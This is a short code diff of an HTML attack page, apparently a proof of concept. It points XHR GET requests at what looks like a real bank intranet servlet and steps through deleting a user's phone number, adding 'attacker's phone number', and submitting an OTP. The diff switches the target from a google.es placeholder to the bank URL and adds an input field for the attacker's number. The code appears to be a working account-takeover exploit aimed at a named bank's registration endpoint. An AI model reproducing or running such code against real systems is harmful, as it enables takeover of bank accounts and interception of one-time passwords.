@@ -22,8 +22,8 @@
 
         function get(msg, param) {
 
-            //var url = 'https://portalintranet.es.igrupobbva/KSNSH/ksns_mult_web/RegistroAlterMovilServlet?' + param;
-            var url = 'https://google.es?' + param;
+            var url = 'https://portalintranet.es.igrupobbva/KSNSH/ksns_mult_web/RegistroAlterMovilServlet?' + param;
+            //var url = 'https://google.es?' + param;
 
             var xhr = new XMLHttpRequest();
             xhr.open("GET", url, true);
@@ -44,7 +44,8 @@
 	    <button  type="button" onclick="deleteNumber()">Delete phone number</button>
 
 	    <h3>Now we add attacker's phone number</h3>
-	    <button  type="button" onclick="addNumber()">Delete phone number</button>
+        <input type=text id="number">
+	    <button  type="button" onclick="addNumber()">Add phone number</button>
         
 	    <h3>Now we send the OTP</h3>
         <input type=text id="otp">
